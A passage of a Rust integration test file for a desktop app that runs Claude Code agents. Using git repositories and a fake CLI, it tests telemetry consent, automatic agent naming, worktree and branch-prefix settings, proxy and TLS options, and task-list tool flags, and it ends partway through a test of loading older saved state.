//! Integration tests of the application core: real git repositories, the fake `claude` CLI
//! (tests/fixtures/fake-claude.cmd, or the `fake-claude` shell script outside Windows) and Tauri's
//! mock runtime.

use crate::agent::{AgentHandle, NotifyKind};
use crate::core::{AgentOptions, Attachment, Core, NotOnBase, SyncOp};
use crate::model::*;
use crate::paths::{test_dir, DataDir};
use crate::usage::Reading;
use serde_json::{json, Value};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;
use tauri::ipc::{Channel, InvokeResponseBody};
use tauri::test::{mock_app, MockRuntime};

/// One sample of `Harness::sample_rest`: what stops an automatic restart, the mark, then again.
pub(crate) type RestSample<T> = (
    Option<crate::updates::Busy>,
    T,
    Option<crate::updates::Busy>,
);

pub(crate) struct Harness {
    pub(crate) core: Arc<Core<MockRuntime>>,
    pub(crate) events: Arc<parking_lot::Mutex<Vec<Value>>>,
    pub(crate) dir: PathBuf,
    _app: tauri::App<MockRuntime>,
}

/// The fake CLI's path. The tests that launch it read the environment it got from the app (its
/// launch log), so the variable an agent of Escouade runs with is taken out of the test process
/// first: inherited, `CLAUDE_CODE_ENABLE_TODO_TOOLS=1` would reach every fake, setting or not (the
/// app leaves the user's environment as it is). `remove_var` is safe in edition 2021; std's own
/// readers of the environment (`var`, `Command`) take the same lock, and the value only ever goes
/// from set to unset, whichever thread of `cargo test` sees it first (nextest: one process a test).
pub(crate) fn fake_cli() -> String {
    static INHERITED: std::sync::Once = std::sync::Once::new();
    INHERITED.call_once(|| std::env::remove_var(TODO_TOOLS_VAR));
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("tests")
        .join("fixtures")
        .join(if cfg!(windows) {
            "fake-claude.cmd"
        } else {
            "fake-claude"
        })
        .to_string_lossy()
        .to_string()
}

pub(crate) fn git(dir: &Path, args: &[&str]) -> String {
    let out = crate::proc::output_in_files(Command::new("git").arg("-C").arg(dir).args(args))
        .expect("git");
    assert!(
        out.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}

/// `pattern` ignored by git in the repository at `dir` and its worktrees, as a `.gitignore` would
/// (its own exclude file: nothing to commit).
pub(crate) fn ignore(dir: &Path, pattern: &str) {
    let file = dir.join(".git").join("info").join("exclude");
    let mut patterns = std::fs::read_to_string(&file).unwrap_or_default();
    if !patterns.is_empty() && !patterns.ends_with('\n') {
        patterns.push('\n');
    }
    patterns.push_str(pattern);
    patterns.push('\n');
    std::fs::create_dir_all(file.parent().unwrap()).unwrap();
    std::fs::write(&file, patterns).unwrap();
}

/// A git repository with one commit.
pub(crate) fn repo(dir: &Path) -> PathBuf {
    let r = dir.join("repo");
    std::fs::create_dir_all(r.join("src")).unwrap();
    git(&r, &["init", "-q", "-b", "main"]);
    git(&r, &["config", "user.email", "t@t"]);
    git(&r, &["config", "user.name", "t"]);
    git(&r, &["config", "core.autocrlf", "false"]);
    std::fs::write(r.join("src").join("app.ts"), "const a = 1;\n").unwrap();
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-qm", "init"]);
    r
}

impl Drop for Harness {
    fn drop(&mut self) {
        // The board's passes and the other tasks of the core run on the application's runtime,
        // which goes on after the test: the processes they started would stay until the whole run
        // ends (see `a_process_started_in_the_background_stops_with_the_harness_that_owns_it`).
        self.core.stop_for_good();
    }
}

pub(crate) fn harness(name: &str) -> Harness {
    let dir = test_dir(name);
    let data = DataDir::new(dir.join("data"));
    data.ensure().unwrap();
    // The account each test runs its agents on: Claude Code's Principal, added as the user would
    // (a first installation has none, ESC-128).
    let settings = Settings {
        claude_path: fake_cli(),
        sound: false,
        os_notifications: false,
        idle_stop_minutes: 1,
        accounts: vec![crate::accounts::principal()],
        ..Default::default()
    };
    std::fs::write(data.settings_file(), serde_json::to_vec(&settings).unwrap()).unwrap();
    let app = mock_app();
    let (core, _rx) = Core::load(app.handle().clone(), data);
    let events = Arc::new(parking_lot::Mutex::new(Vec::new()));
    let sink = events.clone();
    core.hub.set_channel(Channel::new(move |body| {
        if let InvokeResponseBody::Json(s) = body {
            sink.lock().push(serde_json::from_str(&s).unwrap());
        }
        Ok(())
    }));
    Harness {
        core,
        events,
        dir,
        _app: app,
    }
}

impl Harness {
    /// A project of a new repository, its worktrees (`worktrees`) made with the agent, as before
    /// ESC-156: its own tests take `project_as_new`, as a new project is.
    pub(crate) async fn project(&self, worktrees: bool) -> (Project, PathBuf) {
        let (p, r) = self.project_as_new(worktrees).await;
        let p = {
            let mut projects = self.core.projects.write();
            let p = projects.iter_mut().find(|x| x.id == p.id).unwrap();
            p.worktree_at_first_message = false;
            p.clone()
        };
        (p, r)
    }

    /// A project of a new repository with the settings of a new one.
    pub(crate) async fn project_as_new(&self, worktrees: bool) -> (Project, PathBuf) {
        let r = repo(&self.dir);
        let p = self
            .core
            .create_project(
                &r.to_string_lossy(),
                "demo",
                "oklch(0.72 0.12 48)",
                worktrees,
                None,
                true,
            )
            .await
            .unwrap();
        (p, r)
    }

    pub(crate) fn agent(&self, id: &str) -> AgentMeta {
        self.core.agent(id).unwrap().lock().meta.clone()
    }

    /// Samples, about every millisecond until the flag returned is set (30 s at most), what an
    /// automatic restart would find (`updates::busy`) just before and just after what `mark`
    /// says of that moment.
    pub(crate) fn sample_rest<T: Send + 'static>(
        &self,
        mark: impl Fn(&Core<MockRuntime>) -> T + Send + 'static,
    ) -> (Arc<AtomicBool>, std::thread::JoinHandle<Vec<RestSample<T>>>) {
        use crate::updates::{busy, snapshot, Updates};
        let stop = Arc::new(AtomicBool::new(false));
        let (core, done) = (self.core.clone(), stop.clone());
        let sampler = std::thread::spawn(move || {
            // No window in tests: only what is under way counts.
            let u = Updates::default();
            let rest = |c: &Core<MockRuntime>| busy(&snapshot(c, &u, now_ms()));
            let started = std::time::Instant::now();
            let mut seen = Vec::new();
            while !done.load(Ordering::Acquire) && started.elapsed() < Duration::from_secs(30) {
                let before = rest(&core);
                let m = mark(&core);
                seen.push((before, m, rest(&core)));
                std::thread::sleep(Duration::from_millis(1));
            }
            seen
        });
        (stop, sampler)
    }

    pub(crate) fn items(&self, id: &str) -> Vec<Value> {
        self.core.agent(id).unwrap().lock().conv.items()
    }

    pub(crate) fn alive(&self, id: &str) -> bool {
        self.core.agent(id).unwrap().lock().proc.is_some()
    }

    pub(crate) async fn wait(&self, what: &str, pred: impl Fn(&Self) -> bool) {
        // A wall-clock deadline, generous: the whole suite runs hundreds of fake `claude`
        // processes at once, and a ticket's loop can take well over 15 s under that load. A real
        // hang still fails, only later.
        let deadline = std::time::Instant::now() + Duration::from_secs(60);
        while std::time::Instant::now() < deadline {
            if pred(self) {
                return;
            }
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
        if pred(self) {
            return;
        }
        panic!("{}", self.timed_out(what));
    }

    /// What a wait for `what` that timed out says.
    pub(crate) fn timed_out(&self, what: &str) -> String {
        format!("timed out waiting for {what}{}", self.views_report())
    }

    /// What a wait that timed out tells of the agents' interfaces (the views' tests), so that a
    /// failure of the CI reads without reproducing it: for each agent with one, whether it runs
    /// (its terminal open, since when), how the last one ended, the end of its screen; then the end
    /// of the fake interfaces' logs (their launches, their hooks).
    pub(crate) fn views_report(&self) -> String {
        let mut out = String::new();
        let mut agents: Vec<AgentHandle> = self.core.agents.read().values().cloned().collect();
        agents.sort_by_key(|a| a.lock().meta.id.clone());
        for a in agents {
            let rt = a.lock();
            if !rt.meta.terminal && rt.tui.is_none() && rt.tui_exit.is_none() {
                continue;
            }
            out.push_str(&format!(
                "\n--- agent {} ({:?}, session {:?}): ",
                rt.meta.id, rt.meta.status, rt.meta.session_id
            ));
            match &rt.tui {
                Some(run) => {
                    let open = self.core.pty.exists(&run.term_id);
                    let registered = match run.registered {
                        Some(r) => format!("registered {} ms ago", r.elapsed().as_millis()),
                        None => "not registered".into(),
                    };
                    out.push_str(&format!(
                        "interface {} ({}, started {} ms ago, {registered}, ready {}), last exit {:?}, {} quick exits\n",
                        run.term_id,
                        if open { "running" } else { "its terminal ended" },
                        run.launched_at.elapsed().as_millis(),
                        rt.interface_ready(),
                        rt.tui_exit,
                        rt.tui_quick_exits
                    ));
                    out.push_str(&screen_end(&run.output.kept()));
                }
                None => out.push_str(&format!(
                    "no interface running, last exit {:?}, {} quick exits\n",
                    rt.tui_exit, rt.tui_quick_exits
                )),
            }
        }
        for file in self.fake_logs() {
            let text = std::fs::read_to_string(&file).unwrap_or_default();
            let lines: Vec<&str> = text.lines().collect();
            out.push_str(&format!(
                "\n--- {} ({} lines), its end:\n",
                file.display(),
                lines.len()
            ));
            for l in &lines[lines.len().saturating_sub(FAKE_LOG_LINES)..] {
                out.push_str(&clip(l, 600));
                out.push('\n');
            }
        }
        out
    }

    /// The logs of the fake interfaces of this test: the fake `claude`'s in the temporary folder
    /// (named after the folder it ran in, under the test's), the other fakes' (`fake-tui-*.jsonl`)
    /// in the test's folder.
    fn fake_logs(&self) -> Vec<PathBuf> {
        let key: String = self
            .dir
            .to_string_lossy()
            .chars()
            .map(|c| if c.is_ascii_alphanumeric() { c } else { '_' })
            .collect();
        let prefix = format!("fake-claude-{key}");
        let mut files: Vec<PathBuf> = std::fs::read_dir(std::env::temp_dir())
            .into_iter()
            .flatten()
            .flatten()
            .filter(|f| f.file_name().to_string_lossy().starts_with(&prefix))
            .map(|f| f.path())
            .filter(|p| p.extension().is_some_and(|e| e == "jsonl"))
            .collect();
        let mut dirs = vec![self.dir.clone()];
        while let Some(d) = dirs.pop() {
            for f in std::fs::read_dir(&d).into_iter().flatten().flatten() {
                let (path, name) = (f.path(), f.file_name().to_string_lossy().into_owned());
                if f.file_type().is_ok_and(|t| t.is_dir()) {
                    // Not into the repositories' own files.
                    if name != ".git" {
                        dirs.push(path);
                    }
                } else if name.starts_with("fake-tui-") && name.ends_with(".jsonl") {
                    files.push(path);
                }
            }
        }
        files.sort();
        files
    }

    pub(crate) async fn turn(&self, id: &str, text: &str) {
        let before = self
            .items(id)
            .iter()
            .filter(|i| i["kind"] == "turn")
            .count();
        self.core
            .send_message(id, text.to_string(), vec![])
            .await
            .unwrap();
        self.wait("turn end", |h| {
            h.items(id).iter().filter(|i| i["kind"] == "turn").count() > before
                && !h.agent(id).status.is_active()
        })
        .await;
    }

    fn error_notices(&self, id: &str) -> Vec<String> {
        self.items(id)
            .iter()
            .filter(|i| i["kind"] == "notice" && i["level"] == "error")
            .map(|i| i["text"].as_str().unwrap().to_string())
            .collect()
    }

    pub(crate) fn launches(&self, cwd: &Path) -> Vec<Vec<String>> {
        self.launch_log(cwd)
            .iter()
            .map(|l| {
                l["argv"]
                    .as_array()
                    .unwrap()
                    .iter()
                    .map(|a| a.as_str().unwrap().to_string())
                    .collect()
            })
            .collect()
    }

    /// What each launch of the fake CLI in `cwd` logged: its arguments, its folder, its proxy and
    /// TLS variables.
    pub(crate) fn launch_log(&self, cwd: &Path) -> Vec<Value> {
        let key: String = cwd
            .to_string_lossy()
            .chars()
            .map(|c| if c.is_ascii_alphanumeric() { c } else { '_' })
            .collect();
        let file = std::env::temp_dir().join(format!("fake-claude-{key}.jsonl"));
        std::fs::read_to_string(file)
            .unwrap_or_default()
            .lines()
            .map(|l| serde_json::from_str(l).unwrap())
            .collect()
    }

    /// Makes the fake CLI started in `cwd` answer a request of `kind` (`initialize`, `remote`)
    /// `ms` milliseconds late.
    pub(crate) fn fake_slow(&self, cwd: &Path, kind: &str, ms: u64) {
        let key: String = cwd
            .to_string_lossy()
            .chars()
            .map(|c| if c.is_ascii_alphanumeric() { c } else { '_' })
            .collect();
        let file = std::env::temp_dir().join(format!("fake-claude-{key}.{kind}-slow"));
        std::fs::write(file, ms.to_string()).unwrap();
    }

    /// Turns on a behavior of the fake CLI started in `cwd` that a `<log>.<kind>` file there
    /// switches (`tui-welcome`, `tui-rc-hold`, `tui-rc-inactive`, `tui-rc-registry-only`, `tui-rc-exit`,
    /// `tui-ignore-quit`);
    /// `fake_unflag` turns it off.
    pub(crate) fn fake_flag(&self, cwd: &Path, kind: &str) {
        self.fake_file(cwd, kind, "");
    }

    /// `fake_flag` with a content for the file to hold.
    pub(crate) fn fake_file(&self, cwd: &Path, kind: &str, content: &str) {
        let key: String = cwd
            .to_string_lossy()
            .chars()
            .map(|c| if c.is_ascii_alphanumeric() { c } else { '_' })
            .collect();
        std::fs::write(
            std::env::temp_dir().join(format!("fake-claude-{key}.{kind}")),
            content,
        )
        .unwrap();
    }

    pub(crate) fn fake_unflag(&self, cwd: &Path, kind: &str) {
        let key: String = cwd
            .to_string_lossy()
            .chars()
            .map(|c| if c.is_ascii_alphanumeric() { c } else { '_' })
            .collect();
        let _ =
            std::fs::remove_file(std::env::temp_dir().join(format!("fake-claude-{key}.{kind}")));
    }

    /// The `<log>.<kind>.jsonl` side log of the fake CLI started in `cwd`.
    pub(crate) fn fake_log(&self, cwd: &Path, kind: &str) -> Vec<Value> {
        let key: String = cwd
            .to_string_lossy()
            .chars()
            .map(|c| if c.is_ascii_alphanumeric() { c } else { '_' })
            .collect();
        let file = std::env::temp_dir().join(format!("fake-claude-{key}.{kind}.jsonl"));
        std::fs::read_to_string(file)
            .unwrap_or_default()
            .lines()
            .map(|l| serde_json::from_str(l).unwrap())
            .collect()
    }

    /// Remote Control requests received by the fake CLI started in `cwd`.
    fn remote_requests(&self, cwd: &Path) -> Vec<Value> {
        self.fake_log(cwd, "control")
    }

    /// User messages written to the stdin of the fake CLI started in `cwd`.
    pub(crate) fn stdin_messages(&self, cwd: &Path) -> Vec<Value> {
        self.fake_log(cwd, "stdin")
    }

    /// The notifications sent so far, as "<title> | <text>".
    pub(crate) fn alerts(&self) -> Vec<String> {
        self.core.alerts.lock().clone()
    }

    /// Waits for `n` notifications to have been sent.
    async fn wait_alerts(&self, n: usize) {
        self.wait("notifications", |h| h.alerts().len() >= n).await;
    }

    fn removed_events(&self, id: &str) -> usize {
        self.events
            .lock()
            .iter()
            .filter(|e| e["type"] == "agentRemoved" && e["id"] == id)
            .count()
    }
}

#[tokio::test]
async fn the_answer_about_usage_statistics_is_kept_and_followed_at_once() {
    let h = harness("telemetry-answer");
    let id_file = h.core.data.telemetry_id_file();
    assert_eq!(h.core.settings.read().telemetry, None);
    assert!(!h.core.telemetry.enabled());
    h.core.set_telemetry(true).unwrap();
    assert!(h.core.telemetry.enabled());
    assert!(id_file.exists());
    // Said yes during the session: it counts as started, without waiting for the next start.
    let names = |h: &Harness| -> Vec<Value> {
        let pending = h.core.telemetry.pending();
        pending
            .into_iter()
            .map(|e| e["eventName"].clone())
            .collect()
    };
    assert_eq!(names(&h), [json!("app_started")]);
    h.core.set_telemetry(true).unwrap();
    assert_eq!(names(&h), [json!("app_started")], "once");
    let saved = || -> Value {
        serde_json::from_str(&std::fs::read_to_string(h.core.data.settings_file()).unwrap())
            .unwrap()
    };
    assert_eq!(saved()["telemetry"], json!(true));
    // The settings window says no: the id goes with what waited.
    h.core.telemetry.track(crate::telemetry::Event::MessageSent);
    let mut s = h.core.settings.read().clone();
    s.telemetry = Some(false);
    h.core.save_settings(s).unwrap();
    assert!(!h.core.telemetry.enabled());
    assert!(!id_file.exists());
    assert!(h.core.telemetry.pending().is_empty());
    assert_eq!(saved()["telemetry"], json!(false));
}

#[tokio::test]
async fn the_start_tells_the_setup_in_broad_strokes_and_nothing_of_the_projects() {
    let h = harness("telemetry-start");
    h.project(false).await;
    match h.core.started_event() {
        crate::telemetry::Event::AppStarted {
            language,
            accounts,
            projects,
            mcp,
            wsl,
        } => {
            assert!(["fr", "en"].contains(&language.as_str()), "{language}");
            assert_eq!(accounts, 1);
            assert_eq!(projects, 1);
            assert!(!mcp);
            assert!(!wsl);
        }
        other => panic!("{other:?}"),
    }
}

#[tokio::test]
async fn a_message_runs_a_turn_and_records_the_cost() {
    let h = harness("turn");
    let (p, _) = h.project(false).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    h.turn(&a.meta.id, "Bonjour").await;
    assert_eq!(h.agent(&a.meta.id).status, AgentStatus::Done);
    // The turn's cost is counted just after its end reaches the window.
    h.wait("the turn counted", |h| h.core.stats.today_cost() > 0.0)
        .await;
    assert!(h
        .items(&a.meta.id)
        .iter()
        .any(|i| i["text"] == "Bonjour, tu as dit : Bonjour"));
}

#[tokio::test]
async fn an_agent_is_named_from_a_question_in_the_language_of_the_texts_for_claude() {
    let h = harness("name-en");
    let (p, _) = h.project(false).await;
    h.core.settings.write().claude_language = "en".into();
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&a, "Create the hello file").await;
    // The fake Haiku found the task in the English question (its first two words) and says it was
    // asked in English, role and question both.
    h.wait("named", |h| h.agent(&a).named).await;
    assert_eq!(h.agent(&a).name, "create-the-fake-en");
}

/// Whether Haiku was asked to name the agent since the app started.
pub(crate) fn naming_asked(h: &Harness, id: &str) -> bool {
    h.core.agent(id).unwrap().lock().naming_asked
}

#[tokio::test]
async fn an_agent_whose_first_messages_are_commands_is_named_from_the_first_ordinary_message() {
    let h = harness("name-after-commands");
    let (p, _) = h.project(false).await;
    h.core.settings.write().claude_language = "en".into();
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    // A built-in command (with or without arguments) and a skill alone say nothing to name it by.
    for command in ["/clear", "/model sonnet", "/impeccable"] {
        h.turn(&a, command).await;
        assert!(!naming_asked(&h, &a), "{command}");
    }
    assert_eq!(
        (h.agent(&a).name.as_str(), h.agent(&a).named),
        ("agent-1", false)
    );
    h.turn(&a, "Create the hello file").await;
    h.wait("named", |h| h.agent(&a).named).await;
    assert_eq!(h.agent(&a).name, "create-the-fake-en");
}

#[tokio::test]
async fn the_automatic_resume_never_names_an_agent() {
    let h = harness("name-not-by-continue");
    let (p, _) = h.project(false).await;
    h.core.settings.write().claude_language = "en".into();
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    // Opened by a skill with no arguments, so nothing to name it by yet.
    h.turn(&a, "/impeccable").await;
    // The usage limit ended a turn, and the app sends « continue » by itself: that is no task.
    let turns = |h: &Harness| h.items(&a).iter().filter(|i| i["kind"] == "turn").count();
    let before = turns(&h);
    h.core.send_continue(&a).await.unwrap();
    h.wait("the resumed turn's end", |h| {
        turns(h) > before && !h.agent(&a).status.is_active()
    })
    .await;
    assert!(!naming_asked(&h, &a));
    assert_eq!(
        (h.agent(&a).name.as_str(), h.agent(&a).named),
        ("agent-1", false)
    );
    // The user's next message does name it.
    h.turn(&a, "Create the hello file").await;
    h.wait("named", |h| h.agent(&a).named).await;
    assert_eq!(h.agent(&a).name, "create-the-fake-en");
}

#[tokio::test]
async fn an_agent_started_by_a_skill_with_arguments_is_named_from_them() {
    let h = harness("name-from-skill");
    let (p, _) = h.project(false).await;
    h.core.settings.write().claude_language = "en".into();
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&a, "/impeccable propose un nouveau design").await;
    h.wait("named", |h| h.agent(&a).named).await;
    // The fake Haiku reads the first two words of the text it was given: the skill's name is one
    // of them, so the slash is not.
    assert_eq!(h.agent(&a).name, "impeccable-propose-fake-en");
}

#[tokio::test]
async fn an_agent_already_named_is_never_named_again_by_a_later_message() {
    let h = harness("name-once");
    let (p, _) = h.project(false).await;
    h.core.settings.write().claude_language = "en".into();
    // Named by Haiku from its first message, then by none of the next ones.
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&a, "Create the hello file").await;
    h.wait("named", |h| h.agent(&a).named).await;
    h.turn(&a, "/impeccable propose un nouveau design").await;
    h.turn(&a, "Delete the other file").await;
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert_eq!(h.agent(&a).name, "create-the-fake-en");
    // Named by the user before it wrote anything: Haiku is never asked.
    let b = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.rename_agent(&b, "mon-agent").await.unwrap();
    h.turn(&b, "Create the hello file").await;
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert_eq!(h.agent(&b).name, "mon-agent");
    assert!(!naming_asked(&h, &b));
}

/// What the window was told of `id` the first time it was told the agent is named.
fn first_told_named(h: &Harness, id: &str) -> Value {
    h.events
        .lock()
        .iter()
        .find(|e| e["type"] == "agent" && e["agent"]["id"] == id && e["agent"]["named"] == true)
        .map(|e| e["agent"].clone())
        .expect("the window was never told the agent is named")
}

#[tokio::test]
async fn an_agent_is_named_only_once_its_branch_is_renamed() {
    let h = harness("name-after-rename");
    let (p, _) = h.project(true).await;
    h.core.settings.write().claude_language = "en".into();
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta;
    let first = a.worktree.unwrap();
    assert_eq!(first.branch, "escouade/agent-1");
    h.turn(&a.id, "Create the hello file").await;
    h.wait("named", |h| h.agent(&a.id).named).await;
    let branch = "escouade/create-the-fake-en";
    // Whoever sees the agent named (a commit proposed meanwhile) finds the worktree on its last
    // branch: the one git runs on, the one the agent says, and the one the window was told.
    let wt = h.agent(&a.id).worktree.unwrap();
    assert_eq!(wt.branch, branch);
    assert_eq!(
        git(Path::new(&wt.path), &["rev-parse", "--abbrev-ref", "HEAD"]),
        branch
    );
    let told = first_told_named(&h, &a.id);
    assert_eq!(told["name"], "create-the-fake-en");
    assert_eq!(told["worktree"]["branch"], branch);
}

#[tokio::test]
async fn two_agents_named_at_the_same_moment_with_the_same_name_get_distinct_names() {
    let h = harness("name-concurrent");
    let (p, _) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let b = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    // Haiku found the same name for both tasks, and both are applied at once (the branch renames
    // are awaited between reading the names taken and setting the name).
    let (named_a, named_b) = tokio::join!(
        h.core.apply_generated_name(&a, "fix-login"),
        h.core.apply_generated_name(&b, "fix-login"),
    );
    named_a.unwrap();
    named_b.unwrap();
    let (seen_a, seen_b) = (h.agent(&a), h.agent(&b));
    assert!(seen_a.named && seen_b.named);
    let mut names = [seen_a.name.clone(), seen_b.name.clone()];
    names.sort();
    assert_eq!(names, ["fix-login", "fix-login-2"]);
    // Each one's branch follows its own name.
    for seen in [seen_a, seen_b] {
        assert_eq!(
            seen.worktree.unwrap().branch,
            format!("escouade/{}", seen.name)
        );
    }
}

#[tokio::test]
async fn an_agent_whose_branch_cannot_be_renamed_is_named_all_the_same() {
    let h = harness("name-branch-taken");
    let (p, r) = h.project(true).await;
    h.core.settings.write().claude_language = "en".into();
    // The branch its name would give is somebody else's.
    git(&r, &["branch", "escouade/create-the-fake-en"]);
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta;
    h.turn(&a.id, "Create the hello file").await;
    h.wait("named", |h| h.agent(&a.id).named).await;
    let seen = h.agent(&a.id);
    assert_eq!(seen.name, "create-the-fake-en");
    let wt = seen.worktree.unwrap();
    assert_eq!(wt.branch, "escouade/agent-1");
    assert_eq!(
        git(Path::new(&wt.path), &["rev-parse", "--abbrev-ref", "HEAD"]),
        "escouade/agent-1"
    );
    assert_eq!(
        first_told_named(&h, &a.id)["worktree"]["branch"],
        "escouade/agent-1"
    );
}

#[tokio::test]
async fn an_agent_of_a_project_that_sets_its_worktrees_folder_and_prefix_works_there() {
    let h = harness("own-worktrees-folder");
    let (p, r) = h.project(true).await;
    h.core.settings.write().claude_language = "en".into();
    // Beside the repository, as the repositories that want no worktree inside them have it.
    h.core
        .update_project(Project {
            worktree_dir: " ../repo-worktrees ".into(),
            agent_branch_prefix: "gg/".into(),
            ..p.clone()
        })
        .unwrap();
    assert_eq!(
        h.core.project(&p.id).unwrap().worktree_dir,
        "../repo-worktrees"
    );
    let beside = r.parent().unwrap().join("repo-worktrees");
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta;
    let wt = a.worktree.clone().unwrap();
    assert_eq!(wt.branch, "gg/agent-1");
    assert_eq!(Path::new(&wt.path), beside.join("agent-1"));
    assert_eq!(a.cwd, wt.path);
    // Named after its first message: its branch keeps the project's prefix.
    h.turn(&a.id, "Create the hello file").await;
    h.wait("named", |h| h.agent(&a.id).named).await;
    assert_eq!(
        h.agent(&a.id).worktree.unwrap().branch,
        "gg/create-the-fake-en"
    );
    // A copy goes beside it, on the same prefix.
    let copy = h.core.duplicate_agent(&a.id).await.unwrap().meta;
    let copied = copy.worktree.unwrap();
    assert_eq!(copied.branch, "gg/create-the-fake-en-copie");
    assert_eq!(Path::new(&copied.path).parent(), Some(beside.as_path()));
    // Back to the default: the next one is in the repository again, the first stays where it is.
    h.core
        .update_project(Project {
            worktree_dir: String::new(),
            ..h.core.project(&p.id).unwrap()
        })
        .unwrap();
    let b = h.core.create_agent(&p.id, None).await.unwrap().meta;
    assert!(Path::new(&b.worktree.unwrap().path).starts_with(r.join(".claude").join("worktrees")));
    assert_eq!(
        Path::new(&h.agent(&a.id).worktree.unwrap().path),
        beside.join("agent-1")
    );
}

#[tokio::test]
async fn a_worktrees_folder_or_a_branch_prefix_that_cannot_be_is_refused_and_nothing_changes() {
    let h = harness("own-worktrees-refused");
    let (p, _) = h.project(true).await;
    for (dir, agents, tickets) in [
        (".", "escouade/", "ticket/"),
        ("../repo", "escouade/", "ticket/"),
        (".git/wt", "escouade/", "ticket/"),
        ("", "a b/", "ticket/"),
        ("", "escouade/", "-t/"),
    ] {
        let e = h
            .core
            .update_project(Project {
                name: "renamed".into(),
                worktree_dir: dir.into(),
                agent_branch_prefix: agents.into(),
                ticket_branch_prefix: tickets.into(),
                ..p.clone()
            })
            .expect_err(dir);
        assert!(!e.to_string().is_empty());
        let kept = h.core.project(&p.id).unwrap();
        assert_eq!(
            (kept.name.as_str(), kept.worktree_dir.as_str()),
            ("demo", ""),
            "{dir} {agents} {tickets}"
        );
    }
}

#[tokio::test]
async fn claude_code_goes_through_the_proxy_and_skips_tls_verification_when_set() {
    let h = harness("network");
    let (p, r) = h.project(false).await;
    // What the last launch of the fake CLI in the project saw: (proxy, tls).
    let seen = |h: &Harness| {
        h.launch_log(&r)
            .last()
            .map(|v| (v["proxy"].clone(), v["tls"].clone()))
    };
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&a, "Bonjour").await;
    assert_eq!(seen(&h), Some((Value::Null, Value::Null)));
    {
        let mut s = h.core.settings.write();
        s.proxy_url = "http://proxy.corp:3128".into();
        s.insecure_tls = true;
    }
    let set = Some((json!("http://proxy.corp:3128"), json!("0")));
    let b = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&b, "Bonjour").await;
    assert_eq!(seen(&h), set);
    // The one-shot questions too (here, the worktree commands read in the project).
    let before = h.launch_log(&r).len();
    h.core.suggest_worktree_steps(&p.id).await.unwrap();
    assert_eq!(h.launch_log(&r).len(), before + 1);
    assert!(h.launches(&r).last().unwrap().contains(&"-p".to_string()));
    assert_eq!(seen(&h), set);
}

#[tokio::test]
async fn agents_start_with_the_task_list_tools_unless_the_setting_is_off_and_one_shot_questions_never_get_them(
) {
    let h = harness("todo-tools");
    let (p, r) = h.project(false).await;
    // The task list variable of the last launch of the fake CLI in the project.
    let seen = |h: &Harness| h.launch_log(&r).last().map(|v| v["todoTools"].clone());
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&a, "Bonjour").await;
    assert_eq!(seen(&h), Some(json!("1")));
    // A one-shot question (here, the worktree commands read in the project) has no use for them.
    let before = h.launch_log(&r).len();
    h.core.suggest_worktree_steps(&p.id).await.unwrap();
    assert_eq!(h.launch_log(&r).len(), before + 1);
    assert!(h.launches(&r).last().unwrap().contains(&"-p".to_string()));
    assert_eq!(seen(&h), Some(Value::Null));
    // Off: the agents that start next have none, and the variable is not forced to another value.
    change_settings(&h, |s| s.todo_tools = false);
    let b = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&b, "Bonjour").await;
    assert_eq!(seen(&h), Some(Value::Null));
    // And on again.
    change_settings(&h, |s| s.todo_tools = true);
    let c = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&c, "Bonjour").await;
    assert_eq!(seen(&h), Some(json!("1")));
}

#[tokio::test]
async fn files_saved_before_the_plan_load_and_a_plan_saved_while_running_comes_back_interrupted() {
    let dir = test_dir("plan-old-files");
    let data = DataDir::new(dir.join("data"));
    data.ensure().unwrap();
    // A settings.json of 1.6: no word of the task list setting.
    std::fs::write(data.settings_file(), r#"{"claudePath":"","sound":false}"#).unwrap();
    let agent = |id: &str, plan: Option<Value>| {
        let mut a = json!({ "id": id, "projectId": "p1", "name": id, "model": "sonnet",
                            "effort": "medium", "mode": "auto", "cwd": dir.to_string_lossy() });
        if let Some(plan) = plan {
            a["plan"] = plan;
        }
        a
    };
    // The window's shape of a plan, written as the app stopped in the middle of a subagent.
    let plan = json!({ "source": "tools",
        "tasks": [{ "id": "1", "title": "Lire", "status": "inProgress" }],
        "agents": [{ "id": "a1", "title": "Aide", "status": "running", "background": true,
                     "tools": 2, "startedAt": 5, "doing": "Lit src/a.ts", "planTask": "1" }],
        "launched": 1, "workflows": [{ "id": "w1", "title": "Revue", "status": "running",
                     "tools": 0, "tokens": 0, "startedAt": 6 }] });
    std::fs::write(
        data.state_file(),
        json!({ "projects": [], "agents": [agent("old", None), agent("busy", Some(plan))] })
            .to_string(),
    )
    .unwrap();
    let app = mock_app();
    let (core, _rx) = Core::load(app.handle().clone(), data);
    assert!(core.settings.read().todo_tools);
    assert!(core.agent("old").unwrap().lock().meta.plan.is_none());
    let busy = core.agent("busy").unwrap().lock().view();
    let plan = busy.meta.plan.expect("its plan");
    // Its tasks are where it left them; what ran in the process that is gone did not end.
    assert_eq!(plan.tasks[0].title, "Lire");
